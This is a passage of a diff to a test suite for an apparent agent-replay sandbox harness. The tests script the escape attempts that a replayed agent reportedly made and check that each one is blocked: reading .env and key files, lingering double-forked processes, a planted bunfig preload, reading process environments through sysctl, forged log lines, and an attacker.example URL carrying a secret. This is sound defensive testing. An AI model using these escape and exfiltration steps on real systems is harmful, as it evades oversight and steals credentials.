@@ -7,6 +7,7 @@ import * as fs from "node:fs";
 import * as os from "node:os";
 import * as path from "node:path";
 import { loggedArgv, servedReadKey } from "../../evals/src/served.ts";
+import { replayCwd } from "../src/lineReplay.ts";
 
 const GUARD = path.join(import.meta.dir, "prompt-dry-run-bin", "cast");
 const HARNESS = path.join(import.meta.dir, "prompt-dry-run.ts");
@@ -396,7 +397,8 @@ describe("guard cast: served reads", () => {
 function harnessWorld(stream: object[]) {
   const dir = fs.mkdtempSync(path.join(tmpRoot, "h-"));
   const bin = path.join(dir, "bin");
-  const rec = path.join(dir, "rec");
+  // Recordings and the scripted stream sit inside the run dir: a run's sandbox reads and writes nothing else under its home folder.
+  const rec = path.join(dir, "run", ".rec");
   const state = path.join(dir, "state");
   fs.mkdirSync(rec, { recursive: true });
   write(path.join(bin, "claude"), [
@@ -418,13 +420,13 @@ function harnessWorld(stream: object[]) {
     'echo "LIVE $* dir=${CODECAST_DIR:-}"',
     "",
   ].join("\n"), 0o755);
-  write(path.join(dir, "stream.jsonl"), stream.map((e) => JSON.stringify(e)).join("\n") + "\n");
+  write(path.join(rec, "stream.jsonl"), stream.map((e) => JSON.stringify(e)).join("\n") + "\n");
   // `--account fake` reads its token from the state dir, so no keychain is touched.
   write(path.join(state, "cc-token-fake.env"), "CLAUDE_CODE_OAUTH_TOKEN='fake-token'\n");
   write(path.join(dir, "prompt.md"), "Reply with the word ok.");
   write(path.join(dir, "system.md"), "Answer briefly.");
   const run = (...args: string[]) => runWith({}, ...args);
-  const envWith = (extra: Record<string, string>) => ({ PATH: `${bin}:${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: dir, CODECAST_DIR: state, FAKE_CLAUDE_REC: rec, FAKE_CLAUDE_STREAM: path.join(dir, "stream.jsonl"), ...extra });
+  const envWith = (extra: Record<string, string>) => ({ PATH: `${bin}:${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: dir, CODECAST_DIR: state, FAKE_CLAUDE_REC: rec, FAKE_CLAUDE_STREAM: path.join(rec, "stream.jsonl"), DRY_RUN_PASS_ENV: "FAKE_CLAUDE_REC,FAKE_CLAUDE_STREAM,FAKE_CLAUDE_BASH", ...extra });
   const runWith = (extra: Record<string, string>, ...args: string[]) => {
     const r = Bun.spawnSync(["bun", HARNESS, ...args], { env: envWith(extra) });
     return { code: r.exitCode, err: r.stderr.toString() };
@@ -477,7 +479,7 @@ describe("prompt-dry-run.ts", () => {
     expect(h.recorded("stdin")).toBe("Reply with the word ok.");
     expect(h.recorded("env")).toBe("20\n1\nfake-token\n");
     expect(JSON.parse(fs.readFileSync(path.join(h.runDir, "args.json"), "utf8"))).toEqual({
-      model: "m-pinned", call: true, maxOutputTokens: 20, tools: [], maxTurns: 1, serve: null, guard: path.join(import.meta.dir, "prompt-dry-run-bin"), isolation: null, claudeMd: null, cwd: null, readOnly: false,
+      model: "m-pinned", call: true, maxOutputTokens: 20, tools: [], maxTurns: 1, serve: null, guard: path.join(import.meta.dir, "prompt-dry-run-bin"), isolation: null, claudeMd: null, seed: null, cwd: null, readOnly: false, fake: null, fakeSeed: null,
     });
     const out = JSON.parse(fs.readFileSync(path.join(h.runDir, "out.json"), "utf8"));
     expect(out).toMatchObject({ result: "ok", stop_reason: "end_turn", is_error: false });
@@ -605,6 +607,361 @@ describe("prompt-dry-run.ts", () => {
     }
   }, 90_000);
 
+  // Each escape a guidance replay took on 2026-11-16 (ct-95483), tried by one rep: it listed a checkout's
+  // secrets through its secret skill, fetched an OAuth client, wrote a catcher under the real ~/.cache and
+  // left it listening on 127.0.0.1:8794 after the rep. Every one must fail, and nothing may outlive the rep.
+  // A Python outside the system's own, whose environment ps can read (it hides that of /usr/bin binaries).
+  const PYTHON = ["/opt/homebrew/bin/python3", "/usr/local/bin/python3"].find((p) => fs.existsSync(p));
+  test.if(process.platform === "darwin" && !!PYTHON)("a replayed agent reads, writes and reaches nothing real, and leaves nothing running", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    // The real machine as the agent would find it: another repo with a .env and a secret skill under the home folder.
+    const other = path.join(h.dir, "src", "union-mobile", "outreach");
+    write(path.join(other, ".env"), "GOOGLE_ADS_CLIENT_SECRET=real\n");
+    write(path.join(other, ".claude", "skills", "secret", "scripts", "secret"), "#!/bin/sh\necho GOOGLE_ADS_CLIENT_SECRET\n", 0o755);
+    // The tree the agent is given to read holds the same two, which stay unreadable even there.
+    const checkout = path.join(import.meta.dir, `.closed-checkout-${process.pid}`);
+    write(path.join(checkout, "README.md"), "readable\n");
+    write(path.join(checkout, ".env.local"), "TOKEN=real\n");
+    write(path.join(checkout, ".claude", "skills", "secret", "SKILL.md"), "secret\n");
+    // Review finding 6 (2026-11-16): secret shapes beyond .env.
+    for (const f of [".envrc", ".dev.vars", "deploy.pem", "id_ed25519", "service-account-prod.json", ".npmrc", ".netrc"]) write(path.join(checkout, f), "secret\n");
+    const t = (name: string, cmd: string) => `( ${cmd} ) >/dev/null 2>&1; echo "${name} $?"`;
+    const bash = [
+      // Processes that leave the agent's process group (double fork + setsid), as nohup or a tmux server would:
+      // one a non-system binary (its tag shows; the 2026-11-16 catcher was Homebrew python), one a system binary standing in the run dir (its cwd shows).
+      `/usr/bin/perl -e 'use POSIX; fork and exit; POSIX::setsid(); fork and exit; open(my $f, ">", "$ENV{FAKE_CLAUDE_REC}/lingerer"); print $f $$; close $f; exec "${PYTHON}", "-c", "import time; time.sleep(300)"'`,
+      `( cd "$FAKE_CLAUDE_REC" && /usr/bin/perl -e 'use POSIX; fork and exit; POSIX::setsid(); fork and exit; open(my $f, ">", "$ENV{FAKE_CLAUDE_REC}/lingerer2"); print $f $$; close $f; exec "/bin/sleep", "300"' )`,
+      t("list-home", `ls '${h.dir}'`),
+      t("read-other-repo", `cat '${other}/.env'`),
+      t("run-other-secret-skill", `'${other}/.claude/skills/secret/scripts/secret' list`),
+      t("read-checkout", "cat README.md"),
+      t("read-checkout-env", "cat .env.local"),
+      t("read-checkout-secret-skill", "cat .claude/skills/secret/SKILL.md"),
+      ...[".envrc", ".dev.vars", "deploy.pem", "id_ed25519", "service-account-prod.json", ".npmrc", ".netrc"].map((f) => t(`read-checkout-${f}`, `cat ${f}`)),
+      t("write-user-cache", `: > "$(getconf DARWIN_USER_CACHE_DIR)dry-run-probe-$$"`),
+      t("write-real-cache", `mkdir -p '${h.dir}/.cache/gadsoauth' && : > '${h.dir}/.cache/gadsoauth/catcher.py'`),
+      t("write-checkout", ": > probe.txt"),
+      t("curl-via-proxy", "curl -sSf --max-time 10 https://oauth2.googleapis.com/token"),
+      t("curl-direct", "curl -sSf --noproxy '*' --max-time 5 https://1.1.1.1"),
+      t("listen-8794", `/usr/bin/perl -MIO::Socket::INET -e 'exit(IO::Socket::INET->new(Listen => 1, LocalAddr => "127.0.0.1", LocalPort => 8794, ReuseAddr => 1) ? 0 : 1)'`),
+      t("cast-vault", "cast vault get GOOGLE_ADS_CLIENT_SECRET"),
+      t("env-credential", '[ -n "${FOO_API_TOKEN:-}" ]'),
+      "sleep 1",
+      // Both still running when the agent's turn ends: what the sweep must then kill.
+      'for n in lingerer lingerer2; do kill -0 "$(cat "$FAKE_CLAUDE_REC/$n")" 2>/dev/null && echo "$n-alive 0" || echo "$n-alive 1"; done',
+    ].join("; ");
+    try {
+      const r = h.runWith({ FAKE_CLAUDE_BASH: bash, FOO_API_TOKEN: "s3cret" }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", checkout);
+      expect(r.err).toBe("");
+      expect(r.code).toBe(0);
+      const results = Object.fromEntries(h.recorded("bash")!.trim().split("\n").map((l) => l.split(" ")));
+      // The one thing it may do: read the tree it was given.
+      expect(results["read-checkout"]).toBe("0");
+      for (const escape of ["list-home", "read-other-repo", "run-other-secret-skill", "read-checkout-env", "read-checkout-secret-skill", "write-real-cache", "write-checkout", "curl-via-proxy", "curl-direct", "listen-8794", "cast-vault", "env-credential", "write-user-cache", ...[".envrc", ".dev.vars", "deploy.pem", "id_ed25519", "service-account-prod.json", ".npmrc", ".netrc"].map((f) => `read-checkout-${f}`)]) {
+        expect({ escape, rc: results[escape] }).not.toEqual({ escape, rc: "0" });
+      }
+      expect(fs.existsSync(path.join(h.dir, ".cache", "gadsoauth"))).toBe(false);
+      expect(fs.existsSync(path.join(checkout, "probe.txt"))).toBe(false);
+      expect(h.recorded("real-calls") ?? "").not.toContain("vault");
+      expect(fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8")).toContain("REFUSED vault get GOOGLE_ADS_CLIENT_SECRET");
+      const alive = (pid: number) => { try { process.kill(pid, 0); return true; } catch { return false; } };
+      expect([results["lingerer-alive"], results["lingerer2-alive"]]).toEqual(["0", "0"]);
+      for (const name of ["lingerer", "lingerer2"]) {
+        const pid = Number(h.recorded(name));
+        expect({ name, pid: pid > 0 }).toEqual({ name, pid: true });
+        expect({ name, alive: alive(pid) }).toEqual({ name, alive: false });
+      }
+      expect(Number(fs.readFileSync(path.join(h.runDir, "swept.txt"), "utf8"))).toBeGreaterThanOrEqual(2);
+    } finally {
+      fs.rmSync(checkout, { recursive: true, force: true });
+    }
+  }, 90_000);
+
+  // Review finding 1 (2026-11-16): the broker ran the guard outside the sandbox, with the real home folder, in a
+  // directory the agent chose (or its run dir), so a bunfig.toml preload there ran the agent's code unsandboxed;
+  // and it wrote each live read's copy into the run dir, through any link the agent had planted there.
+  test.if(process.platform === "darwin")("the broker runs no code the agent planted and writes nothing where the agent points", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const pwned = path.join(h.dir, "pwned");
+    const victim = path.join(h.dir, "victim.txt");
+    write(victim, "untouched\n");
+    // The real CLI as a bun program (a dev checkout's cast is `bun main.ts`, and a compiled one loads bunfig.toml too).
+    write(path.join(h.bin, "cast"), [
+      `#!${process.execPath}`,
+      'if (process.env.FAKE_CLAUDE_REC) require("fs").appendFileSync(`${process.env.FAKE_CLAUDE_REC}/real-calls`, `${process.argv.slice(2).join(" ")} dir=${process.env.CODECAST_DIR ?? ""}\\n`);',
+      'console.log(`LIVE ${process.argv.slice(2).join(" ")}`);',
+      "",
+    ].join("\n"), 0o755);
+    // The live read's copy, aimed at a file outside the run, planted again before each call.
+    const plant = `k=$(printf 'task\\037ls\\037' | shasum -a 256 | cut -d' ' -f1); rm -f "$RUN_DIR/live-reads/$k.out"; ln -s '${victim}' "$RUN_DIR/live-reads/$k.out"`;
+    const bash = [
+      `printf 'preload = ["./p.ts"]\\n' > bunfig.toml`,
+      `printf 'require("fs").writeFileSync(${JSON.stringify(pwned)}, "ran")\\n' > p.ts`,
+      "cp bunfig.toml p.ts \"$RUN_DIR/\" 2>/dev/null",
+      "cast task ls > /dev/null 2>&1",
+      plant, `printf 'task\\0ls\\0' | curl -sS -H "X-Dry-Run-Cwd: $PWD" --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
+      plant, `printf 'task\\0ls\\0' | curl -sS -H "X-Dry-Run-Cwd: $RUN_DIR" --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
+      plant, `printf 'task\\0ls\\0' | curl -sS --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
+    ].join("; ");
+    const r = h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake");
+    expect(r.err).toBe("");
+    expect(r.code).toBe(0);
+    expect(h.recorded("real-calls")).toContain("task ls");
+    expect(fs.existsSync(pwned)).toBe(false);
+    expect(fs.readFileSync(victim, "utf8")).toBe("untouched\n");
+  }, 60_000);
+
+  // Review finding 2 (2026-11-16): sysctl KERN_PROCARGS2 handed the agent every same-user process's environment,
+  // the harness's own (and through it the launching shell's tokens) included.
+  test.if(process.platform === "darwin")("an agent cannot read another process's environment, the harness's included", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const probe = path.join(h.rec, "procargs.js");
+    write(probe, [
+      'const { dlopen, FFIType, ptr } = require("bun:ffi");',
+      'const { symbols } = dlopen("/usr/lib/libSystem.B.dylib", { sysctl: { args: [FFIType.ptr, FFIType.u32, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.u64], returns: FFIType.i32 } });',
+      "const mib = new Int32Array([1, 49, Number(process.argv[2])]); const buf = new Uint8Array(1 << 16); const size = new BigUint64Array([BigInt(buf.length)]);",
+      'const rc = symbols.sysctl(ptr(mib), 3, ptr(buf), ptr(size), null, 0);',
+      'console.log(rc === 0 && Buffer.from(buf.slice(0, Number(size[0]))).toString("latin1").includes("PROC-ENV-SENTINEL") ? "read" : "refused");',
+    ].join("\n"));
+    const bash = [
+      `echo "parent: $('${process.execPath}' '${probe}' $PPID)"`,
+      // The model is reached through the harness, which alone holds the login: anything but the model's endpoints is refused.
+      `echo "account: $(curl -s -o /dev/null -w '%{http_code}' "$ANTHROPIC_BASE_URL/api/oauth/profile")"`,
+    ].join("; ");
+    expect(h.runWith({ FAKE_CLAUDE_BASH: bash, PROBE_TOKEN: "PROC-ENV-SENTINEL" }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
+    expect(h.recorded("bash")).toContain("parent: refused");
+    expect(h.recorded("bash")).toContain("account: 403");
+    // Claude Code in the sandbox holds a placeholder: the login (here "fake-token") never enters any process the agent can read.
+    expect(h.recorded("env")!.split("\n")[2]).toBe("sk-ant-oat01-dry-run-placeholder");
+  }, 60_000);
+
+  // Review findings 3, 5 and 7 (2026-11-16): the fake's world raced under parallel calls, a failed write was logged
+  // (and judged) as done, and calls.log and the world sat where the agent could forge them.
+  test.if(process.platform === "darwin")("the fake answers from the harness: parallel calls each land, failures stay failures, and nothing it records can be forged", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const fake = path.join(h.dir, "fake.ts");
+    write(fake, [
+      'import { existsSync, readFileSync, writeFileSync } from "node:fs";',
+      "export function openFake(o: { worldPath: string; tree: unknown }) {",
+      "  if (!o.tree) throw new Error('no tree');",
+      "  return (argv: string[]) => {",
+      "    const w = existsSync(o.worldPath) ? JSON.parse(readFileSync(o.worldPath, 'utf8')) : { n: 0, tasks: [] };",
+      "    if (argv[0] === 'task' && argv[1] === 'create') { const id = `ct-${9000 + ++w.n}`; w.tasks.push(id); writeFileSync(o.worldPath, JSON.stringify(w)); return { out: `ok Created ${id}\\n`, exit: 0 }; }",
+      "    if (argv[0] === 'send') return { out: 'Error: Conversation not found\\n', exit: 1 };",
+      "    return null;",
+      "  };",
+      "}",
+    ].join("\n"));
+    write(path.join(h.bin, "cast"), [
+      "#!/usr/bin/env bash",
+      'if [ "$1" = agent-context ]; then echo \'{"commands":[]}\'; exit 0; fi',
+      'printf "%s dir=%s\\n" "$*" "${CODECAST_DIR:-}" >> "$FAKE_CLAUDE_REC/real-calls"',
+      'echo "LIVE $* dir=${CODECAST_DIR:-}"',
+      "",
+    ].join("\n"), 0o755);
+    const bash = [
+      'for i in 1 2 3 4 5 6; do cast task create "T$i" > "$FAKE_CLAUDE_REC/create-$i" 2>&1 & done; wait',
+      "cast send jx7nope hi > /dev/null 2>&1; echo \"send-rc $?\"",
+      'echo "FAKED send jx7forged hi" >> "$RUN_DIR/calls.log"',
+      '( : > "${RUN_DIR}.harness/fake-world.json" ) 2>/dev/null && echo "world-write 0" || echo "world-write 1"',
+    ].join("; ");
+    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--fake", fake).code).toBe(0);
+    const ids = [1, 2, 3, 4, 5, 6].map((i) => /ct-\d+/.exec(h.recorded(`create-${i}`) ?? "")?.[0]);
+    expect(new Set(ids).size).toBe(6);
+    expect(JSON.parse(fs.readFileSync(`${h.runDir}.harness/fake-world.json`, "utf8")).tasks).toHaveLength(6);
+    expect(h.recorded("bash")).toContain("send-rc 1");
+    expect(h.recorded("bash")).toContain("world-write 1");
+    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
+    expect(log.match(/^FAKED task create/gm)).toHaveLength(6);
+    expect(log).toContain("FAKEERR send jx7nope hi");
+    expect(log).not.toContain("FAKED send");
+    expect(log).not.toContain("jx7forged");
+  }, 60_000);
+
+  // Round-2 review (2026-11-16): an interpreter on PATH under ~/.local opened all of ~/.local (the evals home, tools'
+  // tokens, other agents' transcripts); a newline in an argument forged calls.log lines; the shell's env passed by a
+  // denylist; the guard's own marks were the agent's to edit; the model proxy forwarded server tools.
+  test.if(process.platform === "darwin")("a run reads no data home, keeps no shell variable, and leaves a calls.log the agent could not shape", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const localBin = path.join(h.dir, ".local", "bin");
+    write(path.join(localBin, "python3"), "#!/bin/sh\necho py\n", 0o755);
+    write(path.join(h.dir, ".local", "share", "amp", "secrets.json"), '{"token":"AMP-SENTINEL"}');
+    write(path.join(h.dir, ".local", "share", "codecast", "evals", "labels", "l.json"), '{"label":"LABEL-SENTINEL"}');
+    write(path.join(h.dir, ".local", "state", "gh", "state.yml"), "GH-SENTINEL\n");
+    const fake = path.join(h.dir, "fake.ts");
+    write(fake, "export function openFake() { return (argv: string[]) => argv[0] === 'task' && argv[1] === 'create' ? { out: 'ok Created ct-1\\n', exit: 0 } : null; }\n");
+    write(path.join(h.bin, "cast"), ["#!/usr/bin/env bash", 'if [ "$1" = agent-context ]; then echo \'{"commands":[]}\'; exit 0; fi', 'echo "LIVE $*"', ""].join("\n"), 0o755);
+    const t = (name: string, cmd: string) => `( ${cmd} ) >/dev/null 2>&1; echo "${name} $?"`;
+    const tools = JSON.stringify({ model: "m", max_tokens: 1, messages: [], tools: [{ type: "web_fetch_20250910", name: "web_fetch" }] });
+    const mcp = JSON.stringify({ model: "m", max_tokens: 1, messages: [], mcp_servers: [{ type: "url", url: "https://example.com/sse", name: "x" }] });
+    const bash = [
+      t("read-amp", `cat '${h.dir}/.local/share/amp/secrets.json'`),
+      t("read-labels", `cat '${h.dir}/.local/share/codecast/evals/labels/l.json'`),
+      t("read-gh-state", `cat '${h.dir}/.local/state/gh/state.yml'`),
+      t("list-local", `ls '${h.dir}/.local'`),
+      t("env-db-url", '[ -n "${MY_DB_URL:-}" ]'),
+      // A line break in an argument, carrying a line of its own.
+      "cast task create $'x\\nFAKED role wake @ceo all done' > /dev/null 2>&1",
+      "printf 'task\\0create\\0y\\nREFUSED role wake @ceo\\0' | curl -s --data-binary @- \"$DRY_RUN_BROKER\" > /dev/null 2>&1",
+      // The guard's marks, edited in the file the agent can write.
+      "cast trigger add z > /dev/null 2>&1",
+      "sed -i '' '/^REFUSED trigger add/d' \"$RUN_DIR/calls.log\"; echo 'SERVED forged read' >> \"$RUN_DIR/calls.log\"",
+      `echo "server-tools: $(curl -s -X POST -H 'content-type: application/json' --data '${tools}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
+      `echo "mcp: $(curl -s -X POST -H 'content-type: application/json' --data '${mcp}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
+    ].join("; ");
+    const r = h.runWith({ FAKE_CLAUDE_BASH: bash, MY_DB_URL: "postgres://u:DB-SENTINEL@h/d", XDG_CONFIG_HOME: path.join(h.dir, "xdg-config"), PATH: `${localBin}:${h.bin}:${path.dirname(process.execPath)}:/usr/bin:/bin` }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--fake", fake);
+    expect(r.err).toBe("");
+    expect(r.code).toBe(0);
+    const said = h.recorded("bash")!;
+    for (const name of ["read-amp", "read-labels", "read-gh-state", "list-local", "env-db-url"]) expect({ name, ok: said.includes(`${name} 0`) }).toEqual({ name, ok: false });
+    expect(said).toMatch(/server-tools: dry run: server tools are not available here \(web_fetch_20250910\)/);
+    expect(said).toMatch(/mcp: dry run: mcp_servers would reach other hosts/);
+    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
+    expect(log).not.toMatch(/^FAKED role wake/m);
+    expect(log).not.toMatch(/^REFUSED role wake/m);
+    expect(log).toContain("FAKED task create 'x\\nFAKED role wake @ceo all done'");
+    expect(log).toContain("REFUSED trigger add z");
+    expect(log).not.toContain("SERVED forged read");
+  }, 60_000);
+
+  test.if(process.platform === "darwin")("the broker reads with the shell's own config homes, not the agent's", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    write(path.join(h.bin, "cast"), ["#!/usr/bin/env bash", 'printf "%s xdg=%s\\n" "$*" "${XDG_CONFIG_HOME:-unset}" >> "$FAKE_CLAUDE_REC/real-calls"', 'echo "LIVE $*"', ""].join("\n"), 0o755);
+    const xdg = path.join(h.dir, "xdg-config");
+    expect(h.runWith({ FAKE_CLAUDE_BASH: "cast task ls > /dev/null 2>&1", XDG_CONFIG_HOME: xdg }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
+    expect(h.recorded("real-calls")).toContain(`task ls xdg=${xdg}`);
+  }, 60_000);
+
+  // Round-3 review (2026-11-16): a URL source in a message made Anthropic fetch any host; an agent kept calls out of
+  // the record (DRY_RUN_PREFLIGHT=1, a stripped DRY_RUN_BROKER) and posted marks no call earned.
+  test.if(process.platform === "darwin")("no message fetches a URL, and every call the agent made is in the record with the mark it earned", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    // The stub's own Bash command, as Claude Code's stream records it, so the harness can set the record against it.
+    const cmds = ["DRY_RUN_PREFLIGHT=1 cast task create hidden-one", "env -u DRY_RUN_BROKER -u DRY_RUN_FAKE_VIA_BROKER cast task create hidden-two"];
+    write(path.join(h.rec, "stream.jsonl"), [
+      ...cmds.map((command, i) => JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id: `t${i}`, name: "Bash", input: { command } }] } })),
+      JSON.stringify({ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }),
+    ].join("\n") + "\n");
+    const image = JSON.stringify({ model: "m", max_tokens: 1, messages: [{ role: "user", content: [{ type: "image", source: { type: "url", url: "https://attacker.example/?d=secret" } }] }] });
+    const bash = [
+      ...cmds.map((c) => `${c} > /dev/null 2>&1`),
+      // Marks no call earned: a SERVED for a read the record does not hold, and a LIVE the broker never ran.
+      `id=$(printf 'task\\0show\\0ct-999\\0' | curl -s --data-binary @- "\${DRY_RUN_BROKER%/read}/begin"); printf "%s\\0SERVED" "$id" | curl -s -o /dev/null -w "forged-served %{http_code}\\n" --data-binary @- "\${DRY_RUN_BROKER%/read}/mark"`,
+      `id=$(printf 'task\\0ls\\0' | curl -s --data-binary @- "\${DRY_RUN_BROKER%/read}/begin"); printf "%s\\0LIVE" "$id" | curl -s -o /dev/null -w "forged-live %{http_code}\\n" --data-binary @- "\${DRY_RUN_BROKER%/read}/mark"`,
+      `echo "url-source: $(curl -s -X POST -H 'content-type: application/json' --data '${image}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
+    ].join("; ");
+    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
+    const said = h.recorded("bash")!;
+    expect(said).toContain("forged-served 400");
+    expect(said).toContain("forged-live 400");
+    expect(said).toMatch(/url-source: dry run: content Anthropic would fetch from a URL is not available here/);
+    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
+    expect(log).toContain("REFUSED task create hidden-one");
+    expect(log).toContain("REFUSED task create hidden-two");
+    expect(log).not.toMatch(/^(SERVED task show ct-999|LIVE task ls)$/m);
+  }, 60_000);
+
+  // Round-3 review (2026-11-16): line replays broke in the closed world: a --shared clone's objects and a worktree's
+  // common dir sit in the real checkout, its node_modules link there, and its read-only database URL is a .env.
+  test.if(process.platform === "darwin")("a replayed checkout works: git through a worktree or a shared clone, linked dependencies, the run's own env file", () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const repos = path.join(h.dir, "repos");
+    const main = path.join(repos, "main");
+    fs.mkdirSync(main, { recursive: true });
+    const git = (cwd: string, ...args: string[]) => { const r = Bun.spawnSync(["git", "-C", cwd, ...args], { env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }); if (r.exitCode !== 0) throw new Error(r.stderr.toString()); };
+    git(main, "init", "-q", "-b", "main");
+    write(path.join(main, "a.txt"), "a\n");
+    git(main, "add", "a.txt");
+    git(main, "commit", "-q", "-m", "first-commit");
+    git(main, "worktree", "add", "-q", path.join(repos, "wt"));
+    const deps = path.join(repos, "deps", "node_modules");
+    write(path.join(deps, "dep", "package.json"), '{"name":"dep"}\n');
+    fs.mkdirSync(h.runDir, { recursive: true });
+    const tree = path.join(h.runDir, "tree");
+    git(h.runDir, "clone", "-q", "--shared", main, tree);
+    fs.symlinkSync(deps, path.join(tree, "node_modules"));
+    write(path.join(tree, ".env.replay"), "DATABASE_URL=postgres://reader@127.0.0.1:1/db\n");
+    const t = (name: string, cmd: string) => `( ${cmd} ) >/dev/null 2>&1; echo "${name} $?"`;
+    const clone = [t("clone-log", "git log -1 --format=%s"), t("clone-deps", "cat node_modules/dep/package.json"), t("clone-env", "cat .env.replay")].join("; ");
+    const r = h.runWith({ FAKE_CLAUDE_BASH: clone }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", tree, "--read", deps);
+    expect(r.err).toBe("");
+    expect(r.code).toBe(0);
+    for (const name of ["clone-log", "clone-deps", "clone-env"]) expect(h.recorded("bash")).toContain(`${name} 0`);
+    // A Try station in a worktree of the real checkout: its .git is a file pointing into the main checkout's .git.
+    const h2 = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const r2 = h2.runWith({ FAKE_CLAUDE_BASH: `echo "worktree-msg $(git log -1 --format=%s 2>&1)"` }, "--run", h2.runDir, "--prompt", h2.prompt, "--model", "m", "--account", "fake", "--cwd", path.join(repos, "wt"));
+    expect(r2.err).toBe("");
+    expect(h2.recorded("bash")).toContain("worktree-msg first-commit");
+  }, 60_000);
+
+  // End to end (round-3 review): a line replay's clone and a Try station's worktree through the closed world, with
+  // line replay's own clone builder (replayCwd) and the arguments each launcher passes: git log, a test file that
+  // imports a linked dependency, and a read-only database on --allow-port that refuses a write.
+  // The first Postgres install whose server actually starts (a Homebrew keg can lose a library it links).
+  const PG = ["/opt/homebrew/opt/postgresql@17/bin", "/opt/homebrew/opt/postgresql@16/bin", "/opt/homebrew/opt/postgresql@15/bin", "/opt/homebrew/bin", "/usr/local/bin"].find((d) => fs.existsSync(path.join(d, "initdb")) && fs.existsSync(path.join(d, "psql")) && Bun.spawnSync([path.join(d, "postgres"), "-V"]).exitCode === 0);
+  test.if(process.platform === "darwin" && !!PG)("end to end: a line replay and a Try station run git, tests and a read-only database in the closed world", async () => {
+    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+    const pg = path.join(h.dir, "pg");
+    const port = 20000 + Math.floor(Math.random() * 20000);
+    const sh = (cmd: string[], env: Record<string, string> = {}) => { const r = Bun.spawnSync(cmd, { env: { ...process.env, ...env } }); if (r.exitCode !== 0) throw new Error(`${cmd.join(" ")}: ${r.stderr}`); return r.stdout.toString(); };
+    sh([`${PG}/initdb`, "-D", pg, "-U", "owner", "-A", "trust"], { LC_ALL: "C" });
+    // A socket path has a ~100 byte limit, so the socket dir is a short one.
+    const sock = fs.mkdtempSync("/tmp/pg-");
+    sh([`${PG}/pg_ctl`, "-D", pg, "-l", path.join(h.dir, "pg.log"), "-o", `-p ${port} -k ${sock} -h 127.0.0.1`, "-w", "start"], { LC_ALL: "C" });
+    try {
+      const psql = (sql: string) => sh([`${PG}/psql`, "-h", "127.0.0.1", "-p", String(port), "-U", "owner", "-d", "postgres", "-v", "ON_ERROR_STOP=1", "-tAc", sql]);
+      psql("create table notes (note text); insert into notes values ('from-the-db'); create role reader login; grant select on notes to reader;");
+      // A repository with a test file whose import resolves through its node_modules.
+      const top = path.join(h.dir, "repo");
+      const git = (cwd: string, ...args: string[]) => sh(["git", "-C", cwd, ...args], { GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" });
+      fs.mkdirSync(top, { recursive: true });
+      git(top, "init", "-q", "-b", "main");
+      write(path.join(top, "package.json"), '{"name":"e2e","private":true}\n');
+      write(path.join(top, "math.test.ts"), 'import { expect, test } from "bun:test";\nimport { add } from "adder";\ntest("adds", () => expect(add(2, 3)).toBe(5));\n');
+      write(path.join(top, ".gitignore"), "node_modules\n.env.e2e\n");
+      git(top, "add", "-A");
+      git(top, "commit", "-q", "-m", "e2e-commit");
+      write(path.join(top, "node_modules", "adder", "package.json"), '{"name":"adder","main":"index.js"}\n');
+      write(path.join(top, "node_modules", "adder", "index.js"), "exports.add = (a, b) => a + b;\n");
+      write(path.join(top, ".env.e2e"), `DATABASE_URL=postgres://reader@127.0.0.1:${port}/postgres\n`);
+      const agent = [
+        'echo "log: $(git log -1 --format=%s 2>&1)"',
